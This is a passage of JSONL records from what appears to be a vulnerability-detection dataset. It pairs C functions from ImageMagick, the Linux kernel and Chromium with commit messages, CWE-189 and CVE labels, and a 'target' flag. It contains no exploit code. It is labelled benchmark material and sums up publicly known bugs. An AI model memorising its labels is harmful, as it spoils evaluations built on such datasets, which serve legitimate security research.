\n   ssize_t\n    y;\n\n  unsigned char\n    *buffer,\n    *packed_scanline,\n    *scanline;\n \n   unsigned short\n     base_address,\n     transfer_mode;\n \n   /*\n    Open output image file.\n  */\n  assert(image_info != (const ImageInfo *) NULL);\n  assert(image_info->signature == MagickSignature);\n  assert(image != (Image *) NULL);\n  assert(image->signature == MagickSignature);\n  if (image->debug != MagickFalse)\n    (void) LogMagickEvent(TraceEvent,GetMagickModule(),\"%s\",image->filename);\n  if ((image->columns > 65535L) || (image->rows > 65535L))\n    ThrowWriterException(ImageError,\"WidthOrHeightExceedsLimit\");\n  assert(exception != (ExceptionInfo *) NULL);\n  assert(exception->signature == MagickSignature);\n  status=OpenBlob(image_info,image,WriteBinaryBlobMode,exception);\n  if (status == MagickFalse)\n    return(status);\n  (void) TransformImageColorspace(image,sRGBColorspace,exception);\n  /*\n    Initialize image info.\n  */\n  size_rectangle.top=0;\n  size_rectangle.left=0;\n  size_rectangle.bottom=(short) image->rows;\n  size_rectangle.right=(short) image->columns;\n  frame_rectangle=size_rectangle;\n  crop_rectangle=size_rectangle;\n   source_rectangle=size_rectangle;\n   destination_rectangle=size_rectangle;\n   base_address=0xff;\n  row_bytes=image->columns;\n   bounds.top=0;\n   bounds.left=0;\n   bounds.bottom=(short) image->rows;\n  bounds.right=(short) image->columns;\n  pixmap.version=0;\n  pixmap.pack_type=0;\n  pixmap.pack_size=0;\n  pixmap.pixel_type=0;\n  pixmap.bits_per_pixel=8;\n  pixmap.component_count=1;\n  pixmap.component_size=8;\n  pixmap.plane_bytes=0;\n  pixmap.table=0;\n  pixmap.reserved=0;\n  transfer_mode=0;\n  x_resolution=image->resolution.x != 0.0 ? image->resolution.x :\n    DefaultResolution;\n  y_resolution=image->resolution.y != 0.0 ? image->resolution.y :\n    DefaultResolution;\n  storage_class=image->storage_class;\n  if (image_info->compression == JPEGCompression)\n    storage_class=DirectClass;\n  if (storage_class == DirectClass)\n    {\n      pixmap.component_count=image->alpha_trait != UndefinedPixelTrait ? 4 : 3;\n      pixmap.pixel_type=16;\n       pixmap.bits_per_pixel=32;\n       pixmap.pack_type=0x04;\n       transfer_mode=0x40;\n      row_bytes=4*image->columns;\n     }\n   /*\n     Allocate memory.\n  */\n  bytes_per_line=image->columns;\n  if (storage_class == DirectClass)\n    bytes_per_line*=image->alpha_trait != UndefinedPixelTrait ? 4 : 3;\n  buffer=(unsigned char *) AcquireQuantumMemory(PictInfoSize,sizeof(*buffer));\n  packed_scanline=(unsigned char *) AcquireQuantumMemory((size_t)\n   (row_bytes+MaxCount),sizeof(*packed_scanline));\n  scanline=(unsigned char *) AcquireQuantumMemory(row_bytes,sizeof(*scanline));\n  if ((buffer == (unsigned char *) NULL) ||\n      (packed_scanline == (unsigned char *) NULL) ||\n      (scanline == (unsigned char *) NULL))\n    ThrowWriterException(ResourceLimitError,\"MemoryAllocationFailed\");\n  (void) ResetMagickMemory(scanline,0,row_bytes);\n  (void) ResetMagickMemory(packed_scanline,0,(size_t) (row_bytes+MaxCount));\n  /*\n    Write header, header size, size bounding box, version, and reserved.\n  */\n  (void) ResetMagickMemory(buffer,0,PictInfoSize);\n  (void) WriteBlob(image,PictInfoSize,buffer);\n  (void) WriteBlobMSBShort(image,0);\n  (void) WriteBlobMSBShort(image,(unsigned short) size_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) size_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) size_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) size_rectangle.right);\n  (void) WriteBlobMSBShort(image,PictVersion);\n  (void) WriteBlobMSBShort(image,0x02ff);  /* version #2 */\n  (void) WriteBlobMSBShort(image,PictInfoOp);\n  (void) WriteBlobMSBLong(image,0xFFFE0000UL);\n  /*\n    Write full size of the file, resolution, frame bounding box, and reserved.\n  */\n  (void) WriteBlobMSBShort(image,(unsigned short) x_resolution);\n  (void) WriteBlobMSBShort(image,0x0000);\n  (void) WriteBlobMSBShort(image,(unsigned short) y_resolution);\n  (void) WriteBlobMSBShort(image,0x0000);\n  (void) WriteBlobMSBShort(image,(unsigned short) frame_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) frame_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) frame_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) frame_rectangle.right);\n  (void) WriteBlobMSBLong(image,0x00000000L);\n  profile=GetImageProfile(image,\"iptc\");\n  if (profile != (StringInfo *) NULL)\n    {\n      (void) WriteBlobMSBShort(image,0xa1);\n      (void) WriteBlobMSBShort(image,0x1f2);\n      (void) WriteBlobMSBShort(image,(unsigned short)\n        (GetStringInfoLength(profile)+4));\n      (void) WriteBlobString(image,\"8BIM\");\n      (void) WriteBlob(image,GetStringInfoLength(profile),\n        GetStringInfoDatum(profile));\n    }\n  profile=GetImageProfile(image,\"icc\");\n  if (profile != (StringInfo *) NULL)\n    {\n      (void) WriteBlobMSBShort(image,0xa1);\n      (void) WriteBlobMSBShort(image,0xe0);\n      (void) WriteBlobMSBShort(image,(unsigned short)\n        (GetStringInfoLength(profile)+4));\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlob(image,GetStringInfoLength(profile),\n        GetStringInfoDatum(profile));\n      (void) WriteBlobMSBShort(image,0xa1);\n      (void) WriteBlobMSBShort(image,0xe0);\n      (void) WriteBlobMSBShort(image,4);\n      (void) WriteBlobMSBLong(image,0x00000002UL);\n    }\n  /*\n    Write crop region opcode and crop bounding box.\n  */\n  (void) WriteBlobMSBShort(image,PictCropRegionOp);\n  (void) WriteBlobMSBShort(image,0xa);\n  (void) WriteBlobMSBShort(image,(unsigned short) crop_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) crop_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) crop_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) crop_rectangle.right);\n  if (image_info->compression == JPEGCompression)\n    {\n      Image\n        *jpeg_image;\n\n      ImageInfo\n        *jpeg_info;\n\n      size_t\n        length;\n\n      unsigned char\n        *blob;\n\n      jpeg_image=CloneImage(image,0,0,MagickTrue,exception);\n      if (jpeg_image == (Image *) NULL)\n        {\n          (void) CloseBlob(image);\n          return(MagickFalse);\n        }\n      jpeg_info=CloneImageInfo(image_info);\n      (void) CopyMagickString(jpeg_info->magick,\"JPEG\",MagickPathExtent);\n      length=0;\n      blob=(unsigned char *) ImageToBlob(jpeg_info,jpeg_image,&length,\n        exception);\n      jpeg_info=DestroyImageInfo(jpeg_info);\n      if (blob == (unsigned char *) NULL)\n        return(MagickFalse);\n      jpeg_image=DestroyImage(jpeg_image);\n      (void) WriteBlobMSBShort(image,PictJPEGOp);\n      (void) WriteBlobMSBLong(image,(unsigned int) length+154);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBLong(image,0x00010000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00010000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x40000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00400000UL);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBShort(image,(unsigned short) image->rows);\n      (void) WriteBlobMSBShort(image,(unsigned short) image->columns);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBShort(image,768);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00566A70UL);\n      (void) WriteBlobMSBLong(image,0x65670000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000001UL);\n      (void) WriteBlobMSBLong(image,0x00016170UL);\n      (void) WriteBlobMSBLong(image,0x706C0000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBShort(image,768);\n      (void) WriteBlobMSBShort(image,(unsigned short) image->columns);\n      (void) WriteBlobMSBShort(image,(unsigned short) image->rows);\n      (void) WriteBlobMSBShort(image,(unsigned short) x_resolution);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBShort(image,(unsigned short) y_resolution);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x87AC0001UL);\n      (void) WriteBlobMSBLong(image,0x0B466F74UL);\n      (void) WriteBlobMSBLong(image,0x6F202D20UL);\n      (void) WriteBlobMSBLong(image,0x4A504547UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x0018FFFFUL);\n      (void) WriteBlob(image,length,blob);\n      if ((length & 0x01) != 0)\n        (void) WriteBlobByte(image,'\\0');\n      blob=(unsigned char *) RelinquishMagickMemory(blob);\n    }\n  /*\n    Write picture opcode, row bytes, and picture bounding box, and version.\n  */\n  if (storage_class == PseudoClass)\n    (void) WriteBlobMSBShort(image,PictPICTOp);\n  else\n    {\n      (void) WriteBlobMSBShort(image,PictPixmapOp);\n      (void) WriteBlobMSBLong(image,(size_t) base_address);\n    }\n  (void) WriteBlobMSBShort(image,(unsigned short) (row_bytes | 0x8000));\n  (void) WriteBlobMSBShort(image,(unsigned short) bounds.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) bounds.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) bounds.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) bounds.right);\n  /*\n    Write pack type, pack size, resolution, pixel type, and pixel size.\n  */\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.version);\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.pack_type);\n  (void) WriteBlobMSBLong(image,(unsigned int) pixmap.pack_size);\n  (void) WriteBlobMSBShort(image,(unsigned short) (x_resolution+0.5));\n  (void) WriteBlobMSBShort(image,0x0000);\n  (void) WriteBlobMSBShort(image,(unsigned short) (y_resolution+0.5));\n  (void) WriteBlobMSBShort(image,0x0000);\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.pixel_type);\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.bits_per_pixel);\n  /*\n    Write component count, size, plane bytes, table size, and reserved.\n  */\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.component_count);\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.component_size);\n  (void) WriteBlobMSBLong(image,(unsigned int) pixmap.plane_bytes);\n  (void) WriteBlobMSBLong(image,(unsigned int) pixmap.table);\n  (void) WriteBlobMSBLong(image,(unsigned int) pixmap.reserved);\n  if (storage_class == PseudoClass)\n    {\n      /*\n        Write image colormap.\n      */\n      (void) WriteBlobMSBLong(image,0x00000000L);  /* color seed */\n      (void) WriteBlobMSBShort(image,0L);  /* color flags */\n      (void) WriteBlobMSBShort(image,(unsigned short) (image->colors-1));\n      for (i=0; i < (ssize_t) image->colors; i++)\n      {\n        (void) WriteBlobMSBShort(image,(unsigned short) i);\n        (void) WriteBlobMSBShort(image,ScaleQuantumToShort(\n          image->colormap[i].red));\n        (void) WriteBlobMSBShort(image,ScaleQuantumToShort(\n          image->colormap[i].green));\n        (void) WriteBlobMSBShort(image,ScaleQuantumToShort(\n          image->colormap[i].blue));\n      }\n    }\n  /*\n    Write source and destination rectangle.\n  */\n  (void) WriteBlobMSBShort(image,(unsigned short) source_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) source_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) source_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) source_rectangle.right);\n  (void) WriteBlobMSBShort(image,(unsigned short) destination_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) destination_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) destination_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) destination_rectangle.right);\n  (void) WriteBlobMSBShort(image,(unsigned short) transfer_mode);\n  /*\n    Write picture data.\n  */\n  count=0;\n  if (storage_class == PseudoClass)\n    for (y=0; y < (ssize_t) image->rows; y++)\n    {\n      p=GetVirtualPixels(image,0,y,image->columns,1,exception);\n      if (p == (const Quantum *) NULL)\n        break;\n      for (x=0; x < (ssize_t) image->columns; x++)\n      {\n        scanline[x]=(unsigned char) GetPixelIndex(image,p);\n        p+=GetPixelChannels(image);\n      }\n      count+=EncodeImage(image,scanline,(size_t) (row_bytes & 0x7FFF),\n        packed_scanline);\n      if (image->previous == (Image *) NULL)\n        {\n          status=SetImageProgress(image,SaveImageTag,(MagickOffsetType) y,\n            image->rows);\n          if (status == MagickFalse)\n            break;\n        }\n    }\n  else\n    if (image_info->compression == JPEGCompression)\n      {\n        (void) ResetMagickMemory(scanline,0,row_bytes);\n        for (y=0; y < (ssize_t) image->rows; y++)\n          count+=EncodeImage(image,scanline,(size_t) (row_bytes & 0x7FFF),\n            packed_scanline);\n      }\n    else\n      {\n        register unsigned char\n          *blue,\n          *green,\n          *opacity,\n          *red;\n\n        red=scanline;\n        green=scanline+image->columns;\n        blue=scanline+2*image->columns;\n        opacity=scanline+3*image->columns;\n        for (y=0; y < (ssize_t) image->rows; y++)\n        {\n          p=GetVirtualPixels(image,0,y,image->columns,1,exception);\n          if (p == (const Quantum *) NULL)\n            break;\n          red=scanline;\n          green=scanline+image->columns;\n          blue=scanline+2*image->columns;\n          if (image->alpha_trait != UndefinedPixelTrait)\n            {\n              opacity=scanline;\n              red=scanline+image->columns;\n              green=scanline+2*image->columns;\n              blue=scanline+3*image->columns;\n            }\n          for (x=0; x < (ssize_t) image->columns; x++)\n          {\n            *red++=ScaleQuantumToChar(GetPixelRed(image,p));\n            *green++=ScaleQuantumToChar(GetPixelGreen(image,p));\n            *blue++=ScaleQuantumToChar(GetPixelBlue(image,p));\n            if (image->alpha_trait != UndefinedPixelTrait)\n              *opacity++=ScaleQuantumToChar((Quantum) (GetPixelAlpha(image,p)));\n            p+=GetPixelChannels(image);\n          }\n          count+=EncodeImage(image,scanline,bytes_per_line & 0x7FFF,\n            packed_scanline);\n          if (image->previous == (Image *) NULL)\n            {\n              status=SetImageProgress(image,SaveImageTag,(MagickOffsetType) y,\n                image->rows);\n              if (status == MagickFalse)\n                break;\n            }\n        }\n      }\n  if ((count & 0x01) != 0)\n    (void) WriteBlobByte(image,'\\0');\n  (void) WriteBlobMSBShort(image,PictEndOfPictureOp);\n  offset=TellBlob(image);\n  offset=SeekBlob(image,512,SEEK_SET);\n  (void) WriteBlobMSBShort(image,(unsigned short) offset);\n  scanline=(unsigned char *) RelinquishMagickMemory(scanline);\n  packed_scanline=(unsigned char *) RelinquishMagickMemory(packed_scanline);\n  buffer=(unsigned char *) RelinquishMagickMemory(buffer);\n  (void) CloseBlob(image);\n  return(MagickTrue);\n}\n", "func_hash": 95822017928684618624885506276204903880, "file_name": "pict.c", "file_hash": 16918765499069374237812941157141787470, "cwe": ["CWE-189"], "cve": "CVE-2015-8896", "cve_desc": "Integer truncation issue in coders/pict.c in ImageMagick before 7.0.5-0 allows remote attackers to cause a denial of service (application crash) via a crafted .pict file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-8896"}
{"idx": 161457, "project": "linux", "commit_id": "093019cf1b18dd31b2c3b77acce4e000e2cbc9ce", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/093019cf1b18dd31b2c3b77acce4e000e2cbc9ce", "commit_message": "xfs: fix acl count validation in xfs_acl_from_disk()\n\nCommit fa8b18ed didn't prevent the integer overflow and possible\nmemory corruption.  \"count\" can go negative and bypass the check.\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nReviewed-by: Christoph Hellwig <hch@lst.de>\nSigned-off-by: Ben Myers <bpm@sgi.com>", "target": 0, "func": "xfs_acl_from_disk(struct xfs_acl *aclp)\n{\n \tstruct posix_acl_entry *acl_e;\n \tstruct posix_acl *acl;\n \tstruct xfs_acl_entry *ace;\n\tunsigned int count, i;\n \n \tcount = be32_to_cpu(aclp->acl_cnt);\n \tif (count > XFS_ACL_MAX_ENTRIES)\n\t\treturn ERR_PTR(-EFSCORRUPTED);\n\n\tacl = posix_acl_alloc(count, GFP_KERNEL);\n\tif (!acl)\n\t\treturn ERR_PTR(-ENOMEM);\n\n\tfor (i = 0; i < count; i++) {\n\t\tacl_e = &acl->a_entries[i];\n\t\tace = &aclp->acl_entry[i];\n\n\t\t/*\n\t\t * The tag is 32 bits on disk and 16 bits in core.\n\t\t *\n\t\t * Because every access to it goes through the core\n\t\t * format first this is not a problem.\n\t\t */\n\t\tacl_e->e_tag = be32_to_cpu(ace->ae_tag);\n\t\tacl_e->e_perm = be16_to_cpu(ace->ae_perm);\n\n\t\tswitch (acl_e->e_tag) {\n\t\tcase ACL_USER:\n\t\tcase ACL_GROUP:\n\t\t\tacl_e->e_id = be32_to_cpu(ace->ae_id);\n\t\t\tbreak;\n\t\tcase ACL_USER_OBJ:\n\t\tcase ACL_GROUP_OBJ:\n\t\tcase ACL_MASK:\n\t\tcase ACL_OTHER:\n\t\t\tacl_e->e_id = ACL_UNDEFINED_ID;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tgoto fail;\n\t\t}\n\t}\n\treturn acl;\n\nfail:\n\tposix_acl_release(acl);\n\treturn ERR_PTR(-EINVAL);\n}\n", "func_hash": 180034737087154572536773019949847958681, "file_name": "xfs_acl.c", "file_hash": 96796582111495519267481147779527729823, "cwe": ["CWE-189"], "cve": "CVE-2012-0038", "cve_desc": "Integer overflow in the xfs_acl_from_disk function in fs/xfs/xfs_acl.c in the Linux kernel before 3.1.9 allows local users to cause a denial of service (panic) via a filesystem with a malformed ACL, leading to a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-0038"}
{"idx": 161467, "project": "linux", "commit_id": "883a1d49f0d77d30012f114b2e19fc141beb3e8e", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/883a1d49f0d77d30012f114b2e19fc141beb3e8e", "commit_message": "ALSA: control: Make sure that id->index does not overflow\n\nThe ALSA control code expects that the range of assigned indices to a control is\ncontinuous and does not overflow. Currently there are no checks to enforce this.\nIf a control with a overflowing index range is created that control becomes\neffectively inaccessible and unremovable since snd_ctl_find_id() will not be\nable to find it. This patch adds a check that makes sure that controls with a\noverflowing index range can not be created.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>\nAcked-by: Jaroslav Kysela <perex@perex.cz>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>", "target": 0, "func": "int snd_ctl_add(struct snd_card *card, struct snd_kcontrol *kcontrol)\n{\n\tstruct snd_ctl_elem_id id;\n\tunsigned int idx;\n\tunsigned int count;\n\tint err = -EINVAL;\n\n\tif (! kcontrol)\n\t\treturn err;\n \tif (snd_BUG_ON(!card || !kcontrol->info))\n \t\tgoto error;\n \tid = kcontrol->id;\n\tif (id.index > UINT_MAX - kcontrol->count)\n\t\tgoto error;\n\n \tdown_write(&card->controls_rwsem);\n \tif (snd_ctl_find_id(card, &id)) {\n \t\tup_write(&card->controls_rwsem);\n\t\tdev_err(card->dev, \"control %i:%i:%i:%s:%i is already present\\n\",\n\t\t\t\t\tid.iface,\n\t\t\t\t\tid.device,\n\t\t\t\t\tid.subdevice,\n\t\t\t\t\tid.name,\n\t\t\t\t\tid.index);\n\t\terr = -EBUSY;\n\t\tgoto error;\n\t}\n\tif (snd_ctl_find_hole(card, kcontrol->count) < 0) {\n\t\tup_write(&card->controls_rwsem);\n\t\terr = -ENOMEM;\n\t\tgoto error;\n\t}\n\tlist_add_tail(&kcontrol->list, &card->controls);\n\tcard->controls_count += kcontrol->count;\n\tkcontrol->id.numid = card->last_numid + 1;\n\tcard->last_numid += kcontrol->count;\n\tcount = kcontrol->count;\n\tup_write(&card->controls_rwsem);\n\tfor (idx = 0; idx < count; idx++, id.index++, id.numid++)\n\t\tsnd_ctl_notify(card, SNDRV_CTL_EVENT_MASK_ADD, &id);\n\treturn 0;\n\n error:\n\tsnd_ctl_free_one(kcontrol);\n\treturn err;\n}\n", "func_hash": 316970979251179581964202101834491305421, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-4656", "cve_desc": "Multiple integer overflows in sound/core/control.c in the ALSA control implementation in the Linux kernel before 3.15.2 allow local users to cause a denial of service by leveraging /dev/snd/controlCX access, related to (1) index values in the snd_ctl_add function and (2) numid values in the snd_ctl_remove_numid_conflict function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-4656"}
{"idx": 161624, "project": "linux", "commit_id": "072684e8c58d17e853f8e8b9f6d9ce2e58d2b036", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/072684e8c58d17e853f8e8b9f6d9ce2e58d2b036", "commit_message": "USB: gadget: f_hid: fix deadlock in f_hidg_write()\n\nIn f_hidg_write() the write_spinlock is acquired before calling\nusb_ep_queue() which causes a deadlock when dummy_hcd is being used.\nThis is because dummy_queue() callbacks into f_hidg_req_complete() which\ntries to acquire the same spinlock. This is (part of) the backtrace when\nthe deadlock occurs:\n\n  0xffffffffc06b1410 in f_hidg_req_complete\n  0xffffffffc06a590a in usb_gadget_giveback_request\n  0xffffffffc06cfff2 in dummy_queue\n  0xffffffffc06a4b96 in usb_ep_queue\n  0xffffffffc06b1eb6 in f_hidg_write\n  0xffffffff8127730b in __vfs_write\n  0xffffffff812774d1 in vfs_write\n  0xffffffff81277725 in SYSC_write\n\nFix this by releasing the write_spinlock before calling usb_ep_queue()\n\nReviewed-by: James Bottomley <James.Bottomley@HansenPartnership.com>\nTested-by: James Bottomley <James.Bottomley@HansenPartnership.com>\nCc: stable@vger.kernel.org # 4.11+\nFixes: 749494b6bdbb (\"usb: gadget: f_hid: fix: Move IN request allocation to set_alt()\")\nSigned-off-by: Radoslav Gerganov <rgerganov@vmware.com>\nSigned-off-by: Felipe Balbi <felipe.balbi@linux.intel.com>", "target": 0, "func": "static ssize_t f_hidg_write(struct file *file, const char __user *buffer,\n\t\t\t    size_t count, loff_t *offp)\n{\n\tstruct f_hidg *hidg  = file->private_data;\n\tstruct usb_request *req;\n\tunsigned long flags;\n\tssize_t status = -ENOMEM;\n\n\tif (!access_ok(buffer, count))\n\t\treturn -EFAULT;\n\n\tspin_lock_irqsave(&hidg->write_spinlock, flags);\n\n#define WRITE_COND (!hidg->write_pending)\ntry_again:\n\t/* write queue */\n\twhile (!WRITE_COND) {\n\t\tspin_unlock_irqrestore(&hidg->write_spinlock, flags);\n\t\tif (file->f_flags & O_NONBLOCK)\n\t\t\treturn -EAGAIN;\n\n\t\tif (wait_event_interruptible_exclusive(\n\t\t\t\thidg->write_queue, WRITE_COND))\n\t\t\treturn -ERESTARTSYS;\n\n\t\tspin_lock_irqsave(&hidg->write_spinlock, flags);\n\t}\n\n\thidg->write_pending = 1;\n\treq = hidg->req;\n\tcount  = min_t(unsigned, count, hidg->report_length);\n\n\tspin_unlock_irqrestore(&hidg->write_spinlock, flags);\n\tstatus = copy_from_user(req->buf, buffer, count);\n\n\tif (status != 0) {\n\t\tERROR(hidg->func.config->cdev,\n\t\t\t\"copy_from_user error\\n\");\n\t\tstatus = -EINVAL;\n\t\tgoto release_write_pending;\n\t}\n\n\tspin_lock_irqsave(&hidg->write_spinlock, flags);\n\n\t/* when our function has been disabled by host */\n\tif (!hidg->req) {\n\t\tfree_ep_req(hidg->in_ep, req);\n\t\t/*\n\t\t * TODO\n\t\t * Should we fail with error here?\n\t\t */\n\t\tgoto try_again;\n\t}\n\n\treq->status   = 0;\n\treq->zero     = 0;\n\treq->length   = count;\n \treq->complete = f_hidg_req_complete;\n \treq->context  = hidg;\n \n\tspin_unlock_irqrestore(&hidg->write_spinlock, flags);\n\n \tstatus = usb_ep_queue(hidg->in_ep, req, GFP_ATOMIC);\n \tif (status < 0) {\n \t\tERROR(hidg->func.config->cdev,\n \t\t\t\"usb_ep_queue error on int endpoint %zd\\n\", status);\n\t\tgoto release_write_pending;\n \t} else {\n \t\tstatus = count;\n \t}\n \n \treturn status;\n release_write_pending:\n \tspin_lock_irqsave(&hidg->write_spinlock, flags);\n \thidg->write_pending = 0;\n \tspin_unlock_irqrestore(&hidg->write_spinlock, flags);\n \n\twake_up(&hidg->write_queue);\n\n\treturn status;\n}\n", "func_hash": 4425856548019935625114622538560359900, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2019-14763", "cve_desc": "In the Linux kernel before 4.16.4, a double-locking error in drivers/usb/dwc3/gadget.c may potentially cause a deadlock with f_hid.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-14763"}
{"idx": 161998, "project": "Chrome", "commit_id": "a4b20ed4917f1f6fc83b6375a48e2c3895d43a8a", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/a4b20ed4917f1f6fc83b6375a48e2c3895d43a8a", "commit_message": "None", "target": 0, "func": "void BindSkiaToInProcessGL() {\n  static bool host_StubGL_installed = false;\n  if (!host_StubGL_installed) {\n    GrGLBinding binding;\n    switch (gfx::GetGLImplementation()) {\n      case gfx::kGLImplementationNone:\n        NOTREACHED();\n        return;\n      case gfx::kGLImplementationDesktopGL:\n        binding = kDesktop_GrGLBinding;\n        break;\n      case gfx::kGLImplementationOSMesaGL:\n        binding = kDesktop_GrGLBinding;\n        break;\n      case gfx::kGLImplementationEGLGLES2:\n        binding = kES2_GrGLBinding;\n        break;\n       case gfx::kGLImplementationMockGL:\n         NOTREACHED();\n         return;\n      default:\n        NOTREACHED();\n        return;\n     }\n \n     static GrGLInterface host_gl_interface = {\n      binding,\n\n      kProbe_GrGLCapability,   // NPOTRenderTargetSupport\n      kProbe_GrGLCapability,   // MinRenderTargetHeight\n      kProbe_GrGLCapability,   // MinRenderTargetWidth\n\n      StubGLActiveTexture,\n      StubGLAttachShader,\n      StubGLBindAttribLocation,\n      StubGLBindBuffer,\n      StubGLBindTexture,\n      StubGLBlendColor,\n      StubGLBlendFunc,\n      StubGLBufferData,\n      StubGLBufferSubData,\n      StubGLClear,\n      StubGLClearColor,\n      StubGLClearStencil,\n      NULL,  // glClientActiveTexture\n      NULL,  // glColor4ub\n      StubGLColorMask,\n      NULL,  // glColorPointer\n      StubGLCompileShader,\n      StubGLCompressedTexImage2D,\n      StubGLCreateProgram,\n      StubGLCreateShader,\n      StubGLCullFace,\n      StubGLDeleteBuffers,\n      StubGLDeleteProgram,\n      StubGLDeleteShader,\n      StubGLDeleteTextures,\n      StubGLDepthMask,\n      StubGLDisable,\n      NULL,  // glDisableClientState\n      StubGLDisableVertexAttribArray,\n      StubGLDrawArrays,\n      StubGLDrawElements,\n      StubGLEnable,\n      NULL,  // glEnableClientState\n      StubGLEnableVertexAttribArray,\n      StubGLFrontFace,\n      StubGLGenBuffers,\n      StubGLGenTextures,\n      StubGLGetBufferParameteriv,\n      StubGLGetError,\n      StubGLGetIntegerv,\n      StubGLGetProgramInfoLog,\n      StubGLGetProgramiv,\n      StubGLGetShaderInfoLog,\n      StubGLGetShaderiv,\n      StubGLGetString,\n      StubGLGetUniformLocation,\n      StubGLLineWidth,\n      StubGLLinkProgram,\n      NULL,  // glLoadMatrixf\n      NULL,  // glMatrixMode\n      StubGLPixelStorei,\n      NULL,  // glPointSize\n      StubGLReadPixels,\n      StubGLScissor,\n      NULL,  // glShadeModel\n      StubGLShaderSource,\n      StubGLStencilFunc,\n      StubGLStencilFuncSeparate,\n      StubGLStencilMask,\n      StubGLStencilMaskSeparate,\n      StubGLStencilOp,\n      StubGLStencilOpSeparate,\n      NULL,  // glTexCoordPointer\n      NULL,  // glTexEnvi\n      StubGLTexImage2D,\n      StubGLTexParameteri,\n      StubGLTexSubImage2D,\n      StubGLUniform1f,\n      StubGLUniform1i,\n      StubGLUniform1fv,\n      StubGLUniform1iv,\n      StubGLUniform2f,\n      StubGLUniform2i,\n      StubGLUniform2fv,\n      StubGLUniform2iv,\n      StubGLUniform3f,\n      StubGLUniform3i,\n      StubGLUniform3fv,\n      StubGLUniform3iv,\n      StubGLUniform4f,\n      StubGLUniform4i,\n      StubGLUniform4fv,\n      StubGLUniform4iv,\n      StubGLUniformMatrix2fv,\n      StubGLUniformMatrix3fv,\n      StubGLUniformMatrix4fv,\n      StubGLUseProgram,\n      StubGLVertexAttrib4fv,\n      StubGLVertexAttribPointer,\n      NULL,  // glVertexPointer\n      StubGLViewport,\n      StubGLBindFramebuffer,\n      StubGLBindRenderbuffer,\n      StubGLCheckFramebufferStatus,\n      StubGLDeleteFramebuffers,\n      StubGLDeleteRenderbuffers,\n      StubGLFramebufferRenderbuffer,\n      StubGLFramebufferTexture2D,\n      StubGLGenFramebuffers,\n      StubGLGenRenderbuffers,\n      StubGLRenderBufferStorage,\n      StubGLRenderbufferStorageMultisample,\n      StubGLBlitFramebuffer,\n      NULL,  // glResolveMultisampleFramebuffer\n      